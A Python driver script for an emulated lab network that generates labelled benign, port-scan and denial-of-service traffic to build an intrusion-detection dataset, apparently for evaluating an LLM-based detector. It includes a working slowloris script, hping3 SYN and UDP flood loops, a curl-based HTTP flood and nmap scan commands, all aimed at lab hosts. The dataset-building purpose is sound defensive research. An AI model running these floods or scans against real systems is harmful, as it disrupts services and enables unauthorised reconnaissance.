#!/usr/bin/env python3
"""
Traffic generation driver for ChokepointTopo.

What it does
------------
1. Starts real services (HTTP 80 on both servers, HTTPS 443 + DNS 53 on srv_low).
2. Starts a *continuous* benign background on h_user1/h_user2 for the whole run
   (random think times, HTTP/HTTPS/DNS/ping, small pages only: up to 4 KB). Benign traffic is
   therefore present BEFORE, BETWEEN and DURING attacks.
3. Runs attack "episodes" in random order, sizes and techniques, sometimes
   overlapping (scan + DoS at the same time), from several source hosts:
     portscan : nmap -sS / -sT / -sF / -sX / -sN / -sA from h_scan, random rate, port range, targets
     dos      : SYN flood, UDP flood (50-600 packets per burst), HTTP flood, slowloris from h_atk
   Burst size, packet count, payload size and rate are randomised per burst.
4. The two servers probe each other's HTTP/DNS every few seconds and post the result to the
   context API, so the LLM can see service degradation during attacks. These probes stay on
   s4 (never cross s1), so they are not logged as flows.
5. Optionally captures a pcap on s1-eth3 (all server traffic) for CICFlowMeter.
6. Stops once the controller's flow_log_full.csv holds >= TARGET_PER_LABEL rows of every
   label, then build_dataset() randomly samples exactly 2000 rows per label (sorted by
   time) into flow_log.csv, spread across the whole run.

Ground truth for evaluation (NOT given to the LLM): scenario_windows.csv.

Usage
-----
  sudo python3 Topology.py --run-traffic [--seed=N]
or at the mininet> prompt:
  py import sys; sys.path.append('/path/to/dir'); import traffic_gen; traffic_gen.run_scenario(net)
Rebuild flow_log.csv from the full log any time:  python3 traffic_gen.py

Requires on the host: nmap hping3 curl dnsmasq dnsutils(dig) openssl tcpdump(optional)
flow_log.csv holds only the flow features and label; other per-flow data goes to the context API.
"""

import csv
import json
import math
import os
import random
import shutil
import subprocess
import threading
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
FLOW_LOG_FULL = os.path.join(HERE, "flow_log_full.csv")   # written by the controller
FLOW_LOG = os.path.join(HERE, "flow_log.csv")             # final dataset, 2000 rows per label
WINDOWS_CSV = os.path.join(HERE, "scenario_windows.csv")
PCAP_PATH = os.path.join(HERE, "capture_s1_eth3.pcap")
SIM_DIR = "/tmp/netsim"
CONTEXT_API_URL = "http://127.0.0.1:5001/context"

TARGET_PER_LABEL = 2000
LABELS = ("normal", "portscan", "dos")
IDLE_TIMEOUT = 10              # must match Ryu_Controller.py
PAIR_WAIT = 5                  # must match Ryu_Controller.py
SETTLE_SECONDS = IDLE_TIMEOUT + PAIR_WAIT + 4
POLL_SECONDS = 4
STABLE_POLLS = 2
MAX_EXTRA_POLLS = 20
WARMUP_SECONDS = 60            # benign-only warm-up so host baselines exist before the first attack
EPISODE_TIMEOUT = 240
SCAN_RATE_RANGE = (25, 70)     # nmap --max-rate range; much faster can overwhelm the controller
CAPTURE_PCAP = True
MAX_EMPTY_EPISODES = 3

USERS = {"h_user1": "web", "h_user2": "mixed"}
SCAN_TECHS = ["sS", "sS", "sT", "sF", "sX", "sN", "sA"]
# syn/udp: high packet volume. http/slow: application-layer attacks where each flow looks like a
# normal request, so they only show up in rate, fan-in and context. The weights set how often each is picked.
DOS_TECHS, DOS_WEIGHTS = ["syn", "udp", "http", "slow"], [40, 35, 15, 10]


# ------------------------------------------------------------------ helper scripts run on the hosts

HTTPS_SERVER = r'''
import http.server, ssl, sys, os
os.chdir(sys.argv[1])
srv = http.server.ThreadingHTTPServer(("0.0.0.0", 443), http.server.SimpleHTTPRequestHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(sys.argv[2], sys.argv[3])
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
srv.serve_forever()
'''

SLOWLORIS = r'''
import random, socket, sys, time
ip, port, conns, dur = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), float(sys.argv[4])
socks = []
for _ in range(conns):
    try:
        s = socket.create_connection((ip, port), timeout=3)
        s.send(("GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n" % (random.randint(0, 9999), ip)).encode())
        socks.append(s)
    except OSError:
        pass
    time.sleep(0.02)
end = time.time() + dur
while time.time() < end and socks:
    time.sleep(random.uniform(3, 6))          # shorter than IDLE_TIMEOUT so the flow doesn't expire
    for s in list(socks):
        try:
            s.send(("X-a: %d\r\n" % random.randint(1, 5000)).encode())
        except OSError:
            socks.remove(s)
for s in socks:
    s.close()
'''

USER_SIM = r'''
import math, random, subprocess, sys, time
profile, low, crit, https_ok, seed = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4] == "1", int(sys.argv[5])
rnd = random.Random(seed)
NAMES = ["internal.lab", "web.internal.lab", "files.internal.lab"]
FILES = ["/", "/f1k", "/f2k", "/f4k"]          # all pages are 4 KB or less so normal flows stay small
FILE_W = [4, 3, 2, 1]
MIX = {
    "web":   {"browse": 6, "api": 3, "https": 3, "dns": 1, "ping": 0.5},
    "mixed": {"browse": 4, "api": 2, "https": 2, "dns": 3, "ping": 1.0},
}[profile]
THINK = {"web": 0.6, "mixed": 0.8}[profile]   # median think time in seconds

def run(cmd, timeout):
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout)
    except Exception:
        pass

def dig(name, qtype="A"):
    run(["dig", "+time=2", "+tries=1", "@" + low, name, qtype, "+short"], 6)

def http(url, extra=(), timeout=8):
    run(["curl", "-s", "-m", str(timeout), "-o", "/dev/null"] + list(extra) + [url], timeout + 3)

def a_browse():
    name = rnd.choice(NAMES)
    dig(name, rnd.choice(["A", "A", "A", "AAAA"]))
    time.sleep(rnd.uniform(0.02, 0.2))
    for _ in range(rnd.choice([1, 1, 2, 3])):
        http("http://%s%s" % (low, rnd.choices(FILES, FILE_W)[0]), ["-H", "Host: " + name])
        time.sleep(rnd.uniform(0.05, 0.5))

def a_api():
    dig("crit.internal.lab")
    http("http://%s%s" % (crit, rnd.choice(["/", "/", "/f1k", "/f2k"])))

def a_https():
    if not https_ok:
        return a_browse()
    http("https://%s%s" % (low, rnd.choices(FILES, FILE_W)[0]), ["-k"])

def a_dns():
    name = rnd.choice(NAMES + ["crit.internal.lab", "nohost%d.internal.lab" % rnd.randint(1, 999)])
    dig(name, rnd.choice(["A", "A", "AAAA", "TXT", "MX"]))

def a_ping():
    run(["ping", "-c", str(rnd.randint(1, 4)), "-i", "0.3", "-W", "1", rnd.choice([low, crit])], 10)

ACTIONS = {"browse": a_browse, "api": a_api, "https": a_https, "dns": a_dns, "ping": a_ping}
names = list(MIX)
weights = [MIX[n] for n in names]
while True:
    ACTIONS[rnd.choices(names, weights)[0]]()
    time.sleep(rnd.lognormvariate(math.log(THINK), 0.9))
'''


# ----------------------------------------------------------------- generic helpers

def count_rows(label):
    """Rows of this label in the controller's full log."""
    try:
        with open(FLOW_LOG_FULL, newline="") as f:
            return sum(1 for row in csv.DictReader(f) if row.get("label") == label)
    except FileNotFoundError:
        return 0


def _post_context(records):
    try:
        req = urllib.request.Request(CONTEXT_API_URL, data=json.dumps(records).encode(),
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=1).read()
    except Exception:
        pass


def _popen(host, args, **kw):
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    return host.popen(args, **kw)


def _wait_all(procs, timeout=EPISODE_TIMEOUT):
    """Wait for background processes, press Ctrl+C to stop everything."""
    deadline = time.time() + timeout
    try:
        for p in procs:
            try:
                p.wait(timeout=max(0.1, deadline - time.time()))
            except subprocess.TimeoutExpired:
                p.terminate()
    except KeyboardInterrupt:
        for p in procs:
            try:
                p.terminate()
            except Exception:
                pass
        raise


def _settle(labels):
    """Rows only appear after flows age out + the pairing wait; poll until counts stop growing."""
    time.sleep(SETTLE_SECONDS)
    last = {l: count_rows(l) for l in labels}
    unchanged = 0
    for _ in range(MAX_EXTRA_POLLS):
        time.sleep(POLL_SECONDS)
        now = {l: count_rows(l) for l in labels}
        if now == last:
            unchanged += 1
            if unchanged >= STABLE_POLLS:
                return
        else:
            last, unchanged = now, 0


_win_lock = threading.Lock()


def _log_window(label, technique, hosts, target, units, start_ts, end_ts):
    with _win_lock:
        new_file = not os.path.exists(WINDOWS_CSV)
        with open(WINDOWS_CSV, "a", newline="") as f:
            w = csv.writer(f)
            if new_file:
                w.writerow(["label", "technique", "src_hosts", "target_ip", "units", "start_ts_us", "end_ts_us"])
            w.writerow([label, technique, "+".join(hosts), target, units, start_ts * 1e6, end_ts * 1e6])


# ----------------------------------------------------------------- environment: services, files, capture

def prepare_environment(net):
    """Create content, start servers, verify they listen. Returns addresses/flags."""
    os.makedirs(SIM_DIR + "/www", exist_ok=True)
    for name, size in (("f1k", 1024), ("f2k", 2048), ("f4k", 4096)):
        with open("%s/www/%s" % (SIM_DIR, name), "wb") as f:
            f.write(os.urandom(size))
    with open(SIM_DIR + "/www/index.html", "w") as f:
        f.write("<html><body>" + "lab page " * 200 + "</body></html>")
    for fname, text in (("https_server.py", HTTPS_SERVER), ("slowloris.py", SLOWLORIS), ("user_sim.py", USER_SIM)):
        with open("%s/%s" % (SIM_DIR, fname), "w") as f:
            f.write(text)

    https_ok = True
    try:
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                        "-keyout", SIM_DIR + "/key.pem", "-out", SIM_DIR + "/cert.pem",
                        "-subj", "/CN=files.internal.lab", "-days", "7"],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        https_ok = False
        print("WARNING: openssl failed -- no HTTPS traffic will be generated.")

    srv_low, srv_crit = net.get("srv_low"), net.get("srv_crit")
    low_ip, crit_ip = srv_low.IP(), srv_crit.IP()

    srv_low.cmd("dnsmasq --no-daemon --no-resolv --no-hosts --pid-file=%s/dnsmasq.pid "
                "--address=/internal.lab/%s --address=/web.internal.lab/%s "
                "--address=/files.internal.lab/%s --address=/crit.internal.lab/%s "
                "--listen-address=%s --bind-interfaces > /dev/null 2>&1 &"
                % (SIM_DIR, low_ip, low_ip, low_ip, crit_ip, low_ip))
    srv_low.cmd("python3 -m http.server 80 --directory %s/www > /dev/null 2>&1 &" % SIM_DIR)
    if https_ok:
        srv_low.cmd("python3 %s/https_server.py %s/www %s/cert.pem %s/key.pem > /dev/null 2>&1 &"
                    % (SIM_DIR, SIM_DIR, SIM_DIR, SIM_DIR))
    srv_crit.cmd("python3 -m http.server 80 --directory %s/www > /dev/null 2>&1 &" % SIM_DIR)
    time.sleep(2)

    for srv in (srv_low, srv_crit):
        if ":80 " not in srv.cmd("ss -ltn"):
            raise RuntimeError("Nothing is listening on %s:80 -- web server failed to start." % srv.name)
    if ":53 " not in srv_low.cmd("ss -lun"):
        print("WARNING: nothing listening on srv_low:53 -- is dnsmasq installed? DNS lookups will fail.")
    return {"low_ip": low_ip, "crit_ip": crit_ip, "https_ok": https_ok}


def stop_environment():
    subprocess.run(["pkill", "-f", SIM_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["pkill", "-f", "dnsmasq.*internal.lab"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def start_capture():
    """pcap of everything crossing s1<->s4 (all traffic in this scenario touches a server)."""
    if not CAPTURE_PCAP:
        return None
    if shutil.which("tcpdump") is None:
        print("NOTE: tcpdump not found -- skipping pcap capture.")
        return None
    try:
        return subprocess.Popen(["tcpdump", "-i", "s1-eth3", "-n", "-U", "-w", PCAP_PATH],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print("NOTE: could not start tcpdump (%s)." % e)
        return None


def start_user_sims(net, env, rng):
    procs = []
    for host_name, profile in USERS.items():
        procs.append(_popen(net.get(host_name),
                            ["python3", SIM_DIR + "/user_sim.py", profile, env["low_ip"], env["crit_ip"],
                             "1" if env["https_ok"] else "0", str(rng.randint(1, 10 ** 9))]))
    return procs


# ----------------------------------------------------------------- context: service health probes

class HealthProbe(threading.Thread):
    """
    The topology has no spare host, so the two servers probe each other. This traffic stays on s4
    and never crosses s1, so it is not logged as a flow or labelled. Posts kind=service_probe.
    srv_low -> srv_crit HTTP;  srv_crit -> srv_low HTTP and DNS.
    """

    def __init__(self, net, interval=5):
        super().__init__(daemon=True)
        self.crit, self.low = net.get("srv_crit"), net.get("srv_low")
        self.crit_ip, self.low_ip = self.crit.IP(), self.low.IP()
        self.interval = interval
        self._stop_evt = threading.Event()

    def stop(self):
        self._stop_evt.set()

    def run(self):
        while not self._stop_evt.is_set():
            recs = [self._http(self.low, self.crit_ip), self._http(self.crit, self.low_ip), self._dns(self.crit, self.low_ip)]
            _post_context(recs)
            self._stop_evt.wait(self.interval)

    def _http(self, src_host, ip):
        t = time.time()
        out, rc = b"", -1
        try:
            p = src_host.popen(["curl", "-s", "-o", "/dev/null", "-m", "3", "-w",
                                "%{http_code} %{time_connect} %{time_total}", "http://%s/" % ip],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, _ = p.communicate(timeout=6)
            rc = p.returncode
        except Exception:
            pass
        rec = {"kind": "service_probe", "timestamp_us": t * 1e6, "src_ip": src_host.IP(), "dst_ip": ip,
               "target_ip": ip, "dst_port": 80, "service": "http", "success": False, "curl_exit": rc}
        parts = out.decode(errors="ignore").split()
        try:
            if len(parts) == 3:
                rec["http_code"] = int(parts[0])
                rec["connect_ms"] = float(parts[1]) * 1000
                rec["total_ms"] = float(parts[2]) * 1000
                rec["success"] = rc == 0 and parts[0].startswith("2")
        except ValueError:
            pass
        return rec

    def _dns(self, src_host, ip):
        import re
        t = time.time()
        text = ""
        try:
            p = src_host.popen(["dig", "+time=2", "+tries=1", "@" + ip, "internal.lab"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, _ = p.communicate(timeout=6)
            text = out.decode(errors="ignore")
        except Exception:
            pass
        status = re.search(r"status: (\w+)", text)
        qt = re.search(r"Query time: (\d+) msec", text)
        rec = {"kind": "service_probe", "timestamp_us": t * 1e6, "src_ip": src_host.IP(), "dst_ip": ip,
               "target_ip": ip, "dst_port": 53, "service": "dns",
               "success": bool(status and status.group(1) == "NOERROR")}
        if qt:
            rec["total_ms"] = float(qt.group(1))
        return rec


# ----------------------------------------------------------------- attack episodes

_PORT_CTR = {}


def _alloc_ports(host_name, n, rng):
    """Distinct source ports per burst so every burst is its own flow."""
    cur = _PORT_CTR.get(host_name, rng.randint(10000, 40000))
    if cur + n > 65000:
        cur = rng.randint(10000, 20000)
    _PORT_CTR[host_name] = cur + n
    return cur, cur + n - 1


def _size(remaining, rpu, lo, hi, rng):
    want = remaining / max(rpu, 0.05) * 1.05
    cap = rng.uniform(0.4, 1.0) * hi
    return int(max(lo, min(cap, want)))


def scan_episode(net, rng, units):
    host_name = "h_scan"
    h = net.get(host_name)
    crit_ip, low_ip = net.get("srv_crit").IP(), net.get("srv_low").IP()
    targets = rng.choice([[crit_ip], [low_ip], [crit_ip, low_ip]])
    tech = rng.choice(SCAN_TECHS)
    rate = rng.randint(*SCAN_RATE_RANGE)
    timing = rng.choice(["-T3", "-T4"])
    ports_n = max(20, units // len(targets))
    lo = rng.randint(1, 60000 - ports_n)
    hi = lo + ports_n - 1
    extra = ""
    if tech != "sT" and rng.random() < 0.3:
        extra = "--data-length %d" % rng.randint(10, 100)
    cmds = ["nmap -%s -Pn -n %s --max-retries 1 --max-rate %d %s -p %d-%d %s > /dev/null 2>&1"
            % (tech, timing, rate, extra, lo, hi, ip) for ip in targets]
    start = time.time()
    _wait_all([_popen(h, ["bash", "-c", "; ".join(cmds)])])
    meta = {"label": "portscan", "technique": "scan:" + tech, "hosts": [host_name],
            "target": "+".join(targets), "units": ports_n * len(targets), "start": start, "end": time.time()}
    return meta


def _hping_loop(tech, a, b, victim, rng):
    dport = rng.choice([80, 80, 80, 80, 443, 22])
    if tech == "syn":
        flags, size = "-S", "$((RANDOM % 4 == 0 ? RANDOM % 150 : 0))"
    else:
        flags, size = "--udp", "$((20 + RANDOM % 380))"
    return ("for p in $(seq %d %d); do "
            "c=$((50 + RANDOM %% 551)); d=%s; "
            "if [ $((RANDOM %% 2)) -eq 0 ]; then r='--faster'; else r=\"-i u$((1000 + RANDOM %% 4000))\"; fi; "
            "hping3 %s -k $r -c $c -d $d -s $p -p %d %s > /dev/null 2>&1; "
            "done") % (a, b, size, flags, dport, victim)


def dos_episode(net, rng, units, tech):
    hosts = ["h_atk"]
    victim_name = rng.choices(["srv_crit", "srv_low"], [0.8, 0.2])[0]
    victim = net.get(victim_name).IP()
    per = max(1, math.ceil(units / len(hosts)))
    procs = []
    start = time.time()
    for hn in hosts:
        h = net.get(hn)
        if tech in ("syn", "udp"):
            workers = rng.randint(1, 3)
            per_w = math.ceil(per / workers)
            lo, hi = _alloc_ports(hn, per, rng)
            for w in range(workers):
                a, b = lo + w * per_w, min(lo + (w + 1) * per_w - 1, hi)
                if a > b:
                    break
                procs.append(_popen(h, ["bash", "-c", _hping_loop(tech, a, b, victim, rng)]))
        elif tech == "http":
            conc = rng.randint(4, 12)
            path = rng.choice(["/", "/f1k", "/f4k"])
            procs.append(_popen(h, ["bash", "-c", "seq 1 %d | xargs -P %d -I{} curl -s -m 4 -o /dev/null http://%s%s"
                                    % (per, conc, victim, path)]))
        else:  # slowloris
            procs.append(_popen(h, ["python3", SIM_DIR + "/slowloris.py", victim, "80",
                                    str(min(per, 120)), str(rng.randint(15, 35))]))
    _wait_all(procs)
    return {"label": "dos", "technique": "dos:" + tech, "hosts": hosts, "target": victim,
            "units": per * len(hosts), "start": start, "end": time.time()}


def run_attack_phase(net, rng, target):
    rpu = {}                                   # observed rows per unit of attack size, per technique (moving average)
    empty = 0
    while True:
        counts = {l: count_rows(l) for l in ("portscan", "dos")}
        need = [l for l in counts if counts[l] < target]
        if not need:
            return
        chosen = need if (len(need) == 2 and rng.random() < 0.3) else [rng.choice(need)]   # 30% of the time, run both at once

        jobs, results = [], {}
        for label in chosen:
            if label == "portscan":
                tech = None
                units = _size(target - counts[label], rpu.get("scan", 1.0), 40, 700, rng)
                fn = lambda u=units: scan_episode(net, rng, u)
                key = "scan"
            else:
                tech = rng.choices(DOS_TECHS, DOS_WEIGHTS)[0]
                hi = {"syn": 250, "udp": 250, "http": 800, "slow": 120}[tech]
                key = "dos:" + tech
                units = _size(target - counts[label], rpu.get(key, 1.0), 30, hi, rng)
                fn = lambda u=units, t=tech: dos_episode(net, rng, u, t)

            def worker(label=label, fn=fn, key=key):
                results[label] = (key, fn())
            th = threading.Thread(target=worker, daemon=True)
            jobs.append(th)
            th.start()
        for th in jobs:
            th.join()

        _settle(chosen)
        for label, (key, meta) in results.items():
            gained = count_rows(label) - counts[label]
            _log_window(meta["label"], meta["technique"], meta["hosts"], meta["target"],
                        meta["units"], meta["start"], meta["end"])
            if meta["units"]:
                rpu[key] = 0.5 * rpu.get(key, 1.0) + 0.5 * (gained / float(meta["units"]))
            print("[%s] %-10s units=%-4d +%d rows -> %d/%d" % (
                label, meta["technique"], meta["units"], gained, counts[label] + gained, target))
            empty = empty + 1 if gained <= 0 else 0
        if empty >= MAX_EMPTY_EPISODES:
            raise RuntimeError(
                "No new attack rows for %d episodes in a row. Check (1) the ryu-manager terminal for errors, "
                "(2) that 'pingall' still works at the mininet> prompt, (3) that the controller is the latest "
                "Ryu_Controller.py and is writing to %s." % (MAX_EMPTY_EPISODES, FLOW_LOG_FULL))


# ----------------------------------------------------------------- dataset assembly

def build_dataset(target=TARGET_PER_LABEL, seed=42):
    """Randomly sample EXACTLY `target` rows per label from the full log (uniform over the whole
    run), sorted by time, into flow_log.csv. Same columns/order as the full log."""
    with open(FLOW_LOG_FULL, newline="") as f:
        reader = csv.DictReader(f)
        header = reader.fieldnames
        rows = list(reader)
    by = {}
    for r in rows:
        by.setdefault(r["label"], []).append(r)
    rng = random.Random(seed)
    out = []
    for label in LABELS:
        rs = by.get(label, [])
        if len(rs) < target:
            print("WARNING: only %d '%s' rows available (target %d)" % (len(rs), label, target))
        elif len(rs) > target:
            rs = rng.sample(rs, target)
        out.extend(rs)
    out.sort(key=lambda r: float(r["timestamp_us"]))
    with open(FLOW_LOG, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=header)
        w.writeheader()
        w.writerows(out)
    print("Wrote %s (%d rows). Rows per label in the final file / in the full log:" % (FLOW_LOG, len(out)))
    for label in LABELS:
        ts = [float(r["timestamp_us"]) for r in out if r["label"] == label]
        span = ("%.0f s .. %.0f s into the run" % ((min(ts) - float(out[0]["timestamp_us"])) / 1e6,
                                                    (max(ts) - float(out[0]["timestamp_us"])) / 1e6)) if ts else "-"
        print("  %-9s %5d  / %5d   %s" % (label, len(ts), len(by.get(label, [])), span))
    ignored = len(by.get("other", []))
    if ignored:
        print("  (%d 'other' rows, e.g. monitor-host probes, excluded from flow_log.csv)" % ignored)


# ----------------------------------------------------------------- orchestration

def run_scenario(net, target=TARGET_PER_LABEL, seed=None):
    """Fill flow_log_full.csv, then write flow_log.csv with `target` rows per label."""
    rng = random.Random(seed)
    print("Preparing services...")
    env = prepare_environment(net)
    pcap = start_capture()
    sims = start_user_sims(net, env, rng)
    probe = HealthProbe(net)
    probe.start()
    t0 = time.time()
    try:
        print("Benign-only warm-up for %d s..." % WARMUP_SECONDS)
        time.sleep(WARMUP_SECONDS)
        run_attack_phase(net, rng, target)

        waited = 0
        while count_rows("normal") < target and waited < 900:   # keep generating normal traffic until there are enough rows
            print("[normal] %d/%d -- waiting for more benign flows" % (count_rows("normal"), target))
            time.sleep(10)
            waited += 10
        _settle(["normal"])
    finally:
        probe.stop()
        for p in sims:
            try:
                p.terminate()
            except Exception:
                pass
        stop_environment()
        if pcap is not None:
            pcap.terminate()
    _log_window("normal", "background", list(USERS), "servers", 0, t0, time.time())
    build_dataset(target)


if __name__ == "__main__":
    build_dataset()
